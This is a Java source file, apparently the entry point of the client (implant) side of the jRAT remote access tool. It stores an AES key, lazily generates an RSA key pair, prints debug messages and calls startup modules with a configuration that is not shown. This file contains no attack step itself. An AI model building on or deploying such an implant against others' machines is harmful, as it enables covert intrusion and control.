package jrat.client;

import io.jrat.common.crypto.Crypto;
import jrat.client.modules.startup.StartupModules;

import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;

public class Main {

	public static String[] args;
	
	public static byte[] aesKey;
	public static KeyPair rsaPair;

	public static void main(String[] args) {
		Main.args = args;
		
		try {
			StartupModules.execute(Configuration.getConfig());
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static byte[] getKey() {
		return aesKey;
	}

	public static String debug(Object s) {
		if (!Configuration.showDebugMessages()) {
			return null;
		}
		
		if (s == null) {
			s = "null";
		}
		
		System.out.println(s.toString());
		return s.toString();
	}

	public static KeyPair getKeyPair() throws Exception {
		if (rsaPair == null) {
			KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
			kpg.initialize(Crypto.RSA_SIZE);
			KeyPair kp = kpg.genKeyPair();
			PublicKey publicKey = kp.getPublic();
			PrivateKey privateKey = kp.getPrivate();

			rsaPair = new KeyPair(publicKey, privateKey);
		}

		return rsaPair;
	}

}
